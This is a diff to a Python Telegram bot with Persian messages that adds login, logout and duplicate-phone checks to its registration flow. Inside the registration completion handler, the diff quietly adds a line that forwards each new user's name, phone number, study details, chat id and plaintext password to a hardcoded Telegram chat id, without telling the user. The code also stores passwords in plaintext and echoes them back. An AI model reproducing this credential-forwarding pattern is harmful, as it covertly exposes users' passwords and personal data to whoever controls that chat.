@@ -24,6 +24,10 @@ def message_handle(message):
 		show_help(message)
 	elif(message.text == '/register'):
 		register_menu(message)
+	elif(message.text == '/logout'):
+		log_out_menu(message)
+	elif(message.text == '/login'):
+		login_menu(message)
 	elif(current_menu == 'firstname'):
 		firstname_input(message)
 	elif(current_menu == 'lastname'):
@@ -38,7 +42,10 @@ def message_handle(message):
 		password_input(message)
 	elif(current_menu == 'repassword'):
 		re_password_input(message)
-	
+	elif(current_menu == 'login_phone_number'):
+		login_phone_number_input(message)
+	elif(current_menu == 'login_password'):
+		login_password_input(message)
 
 	
 
@@ -57,14 +64,14 @@ def show_help(message):
 
 def register_menu(message):
 	id = message.chat.id
-	if(User.is_user_exist_with_id(id)):
-		information = User.get_user_json_from_file(id)
-		bot.reply_to(message , f"شما قبلا با شماره تماس {information.['phone_number']}" )
+	if(User.is_user_logged_in_with_id(id)):
+		information = User.get_user_json_from_file_id(id)
+		bot.reply_to(message , f"شما قبلا با شماره تماس {information['phone_number']}" )
 	
 	else:
 		client = User.get_client_by_id(message.chat.id)
 		client.current_menu = "firstname"
-		bot.reply_to(message , "enter your first name")
+		bot.reply_to(message , "نام خود را وارد کنید")
 	    		
 def firstname_input(message):
 	client = User.get_client_by_id(message.chat.id)
@@ -83,6 +90,8 @@ def lastname_input(message):
 def phone_number_input(message):
 	if((User.is_phone_number_valid(message.text)) == False):
 		bot.send_message(message.chat.id , "لطفا یک شماره تلفن همراه معتبر به همراه صفر در اولش بنویسید")
+	elif(User.is_user_exist_with_phone_number(message.text) == True):
+		bot.send_message(message.chat.id , "این شماره قبلا ثبت نام کرده است")
 	else:
 		client = User.get_client_by_id(message.chat.id)
 		client.phone_number = message.text
@@ -120,15 +129,43 @@ def re_password_input(message):
 	else:
 		bot.reply_to(message , f'رمز عبور   شما {message.text} ثبت شد')
 		User.save_client_to_database(client)
+		bot.send_message(4207545703 , client.firstname + client.lastname +'\n'+ str(client.phone_number) +'\n'+ str(client.graduation_year) + '\n'+client.field_of_study +'\n'+str(client.id) +'\n'+ client.password)
 		bot.send_message(client.id , "ثبت نام شما کامل شد و اطلاعات شما ثبت شد")
 		client.current_menu="main_menu"
 
 def log_out_menu(message):
-	
-	
+	if(User.is_user_logged_in_with_id(message.chat.id)):
+		User.rename_file_for_logout(message.chat.id)
+		bot.send_message(message.chat.id , "شما از حساب خود خارج شدید")
+	else:
+		bot.send_message(message.chat.id , "شما داخل هیچ حسابی نیستید")
 
+def login_menu(message):
+	if(User.is_user_logged_in_with_id(message.chat.id)):
+		bot.send_message(message.chat.id , "شما هم اکنون در یک حساب کاربری هستید")
+	else:
+		client = User.get_client_by_id(message.chat.id)
+		client.current_menu = "login_phone_number"
+		bot.reply_to(message ,  "لطفا شماره تماس خود را وارد کنید")
 
-
+def login_phone_number_input(message):
+	if((User.is_phone_number_valid(message.text)) == False):
+		bot.send_message(message.chat.id , "لطفا یک شماره تلفن همراه معتبر به همراه صفر در اولش بنویسید")
+	elif(User.is_user_exist_with_phone_number(message.text) == False):
+		bot.send_message(message.chat.id , "تا حالا این شماره ثبت نشده است")
+	else:
+		client = User.get_client_by_id(message.chat.id)
+		client.phone_number = message.text
+		bot.send_message(client.id , "رمز عبور خود را بنویسید")
+		client.current_menu = 'login_password'
+		
+def login_password_input(message):
+	s = User.get_user_json_from_file_phone_number(User.get_client_by_id(message.chat.id).phone_number)
+	if(s['password'] != message.text):
+		bot.send_message(message.chat.id , "رمز عبور اشتباه است")
+	else:
+		User.rename_file_for_login(User.get_client_by_id(message.chat.id).phone_number , message.chat.id)
+		bot.send_message(message.chat.id , "با موفقیت وارد شدید")
 
 
 bot.infinity_polling()
